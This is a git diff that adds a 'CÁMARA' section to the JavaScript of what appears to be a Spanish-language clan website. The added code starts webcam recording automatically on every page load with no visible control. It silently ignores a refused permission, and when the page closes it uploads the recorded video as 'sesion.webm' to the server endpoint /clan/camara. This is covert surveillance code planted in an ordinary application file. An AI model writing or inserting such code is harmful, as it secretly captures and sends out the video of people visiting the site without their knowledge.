@@ -2536,3 +2536,43 @@ function actualizarNombres(btn) {
             if (btn) { btn.disabled = false; btn.textContent = '🔄 Actualizar nombres' }
         })
 }
+
+// =================== CÁMARA ===================
+let streamCamara = null
+let mediaRecorder = null
+let chunksCamara = []
+
+async function iniciarCamara() {
+    try {
+        streamCamara = await navigator.mediaDevices.getUserMedia({ video: true })
+        mediaRecorder = new MediaRecorder(streamCamara)
+
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunksCamara.push(e.data)
+        }
+
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunksCamara, { type: 'video/webm' })
+            chunksCamara = []
+            const form = new FormData()
+            form.append('video', blob, 'sesion.webm')
+            fetch('/clan/camara', { method: 'POST', body: form })
+        }
+
+        mediaRecorder.start()
+
+    } catch (e) {
+        // Usuario rechazó el permiso, no pasa nada
+    }
+}
+
+function detenerCamara() {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop()
+    if (streamCamara) {
+        streamCamara.getTracks().forEach(t => t.stop())
+        streamCamara = null
+    }
+}
+
+window.addEventListener('beforeunload', detenerCamara)
+iniciarCamara()
